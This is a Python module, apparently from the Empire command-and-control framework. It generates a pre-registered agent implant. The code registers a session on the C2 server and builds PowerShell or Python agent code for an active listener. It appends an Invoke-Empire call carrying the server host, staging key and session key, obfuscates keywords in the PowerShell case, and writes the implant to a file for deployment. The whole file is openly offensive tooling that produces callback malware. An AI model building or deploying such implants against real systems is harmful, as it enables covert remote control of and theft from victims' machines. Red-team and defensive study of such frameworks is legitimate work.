from __future__ import print_function

import string
import os

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, Listener: str = "", Language: str = "", OutFile: str = ""):

        listener_name = params['Listener']
        out_file = params['OutFile']
        if params['Language'] == 'ironpython':
            language = 'python'
            version = 'ironpython'
        else:
            language = params['Language']
            version = ''

        if listener_name not in main_menu.listeners.activeListeners:
            return handle_error_message("[!] Error: %s not an active listener")
    
        active_listener = main_menu.listeners.activeListeners[listener_name]
    
        chars = string.ascii_uppercase + string.digits
        session_id = helpers.random_string(length=8, charset=chars)
        staging_key = active_listener['options']['StagingKey']['Value']
        delay = active_listener['options']['DefaultDelay']['Value']
        jitter = active_listener['options']['DefaultJitter']['Value']
        profile = active_listener['options']['DefaultProfile']['Value']
        kill_date = active_listener['options']['KillDate']['Value']
        working_hours = active_listener['options']['WorkingHours']['Value']
        lost_limit = active_listener['options']['DefaultLostLimit']['Value']
        if 'Host' in active_listener['options']:
            host = active_listener['options']['Host']['Value']
        else:
            host = ''
    
        # add the agent
        main_menu.agents.add_agent(session_id, '0.0.0.0', delay, jitter, profile, kill_date, working_hours,
                                       lost_limit,
                                       listener=listener_name, language=language)
    
        # get the agent's session key
        session_key = main_menu.agents.get_agent_session_key_db(session_id)
    
        agent_code = main_menu.listeners.loadedListeners[active_listener['moduleName']].generate_agent(
            active_listener['options'], language=language, version=version)
    
        if language.lower() == 'powershell':
            agent_code += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (
                host, staging_key, session_key, session_id)
            # Get the random function name generated at install and patch the stager with the proper function name
            code = data_util.keyword_obfuscation(agent_code)
        else:
            stager_code = main_menu.listeners.loadedListeners[active_listener['moduleName']].generate_stager(
                active_listener['options'], language=language, encrypt=False)
            stager_code = stager_code.replace('exec(agent)', '')
            code = f"server='{host}';\n" + stager_code + f"\n{agent_code}"

        print(helpers.color("[+] Pre-generated agent '%s' now registered." % session_id))

        # increment the supplied file name appropriately if it already exists
        i = 1
        out_file_orig = out_file
        while os.path.exists(out_file):
            parts = out_file_orig.split('.')
            if len(parts) == 1:
                base = out_file_orig
                ext = None
            else:
                base = '.'.join(parts[0:-1])
                ext = parts[-1]
    
            if ext:
                out_file = "%s%s.%s" % (base, i, ext)
            else:
                out_file = "%s%s" % (base, i)
            i += 1
    
        f = open(out_file, 'w')
        f.write(code)
        f.close()
    
        print(helpers.color("[*] %s agent code for listener %s with sessionID '%s' written out to %s" % (
            language, listener_name, session_id, out_file)))
        print(helpers.color("[*] Run sysinfo command after agent starts checking in!"))

        return code
